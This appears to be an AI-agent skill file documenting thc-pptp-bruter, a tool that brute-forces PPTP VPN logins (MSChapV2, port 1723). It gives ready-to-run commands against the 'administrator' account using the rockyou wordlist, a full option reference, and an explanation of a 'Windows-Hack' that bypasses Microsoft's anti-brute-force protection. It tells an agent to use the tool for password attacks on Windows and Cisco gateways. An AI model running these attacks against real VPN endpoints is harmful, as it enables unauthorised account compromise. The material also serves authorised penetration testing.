---
name: thc-pptp-bruter
description: Brute force PPTP VPN endpoints (TCP port 1723) supporting MSChapV2 authentication. Use when performing password attacks against Windows or Cisco VPN gateways, specifically exploiting weaknesses in Microsoft's anti-brute force implementation to achieve high-speed authentication attempts.
---

# thc-pptp-bruter

## Overview
A standalone brute force tool designed to target PPTP VPN endpoints. It supports the latest MSChapV2 authentication and includes a specific "Windows-Hack" that reuses LCP connections with the same caller-id to bypass Microsoft's anti-brute force protections, allowing for up to 300 password attempts per second. Category: Password Attacks.

## Installation (if not already installed)
Assume the tool is already installed. If the command is missing, install via:

```bash
sudo apt install thc-pptp-bruter
```

## Common Workflows

### Basic brute force against a VPN gateway
```bash
thc-pptp-bruter -u administrator -w /usr/share/wordlists/rockyou.txt 192.168.1.10
```

### High-speed attack with parallel attempts
```bash
thc-pptp-bruter -u vpnuser -w passwords.txt -n 10 -l 200 192.168.1.10
```

### Attack a non-standard PPTP port with verbose debugging
```bash
thc-pptp-bruter -v -p 11723 -u backupmgr -w wordlist.txt 10.0.0.5
```

## Complete Command Reference

```
thc-pptp-bruter [options] <remote host IP>
```

### Options

| Flag | Description |
|------|-------------|
| `-v` | Verbose output / Debug output |
| `-W` | Disable windows hack [default: enabled] |
| `-u <user>` | Username to target [default: administrator] |
| `-w <file>` | Wordlist file [default: stdin] |
| `-p <n>` | PPTP port [default: 1723] |
| `-n <n>` | Number of parallel tries [default: 5] |
| `-l <n>` | Limit to n passwords per second [default: 100] |

## Notes
- **Windows-Hack**: This feature reuses the LCP connection with the same caller-id to circumvent Microsoft's anti-brute forcing protection. It is enabled by default and is highly effective against Windows-based VPN gateways.
- **Performance**: While the default limit is 100 passwords/sec, the tool can theoretically reach 300 passwords/sec against vulnerable targets.
- **Wordlists**: If no wordlist is specified with `-w`, the tool expects input from `stdin`.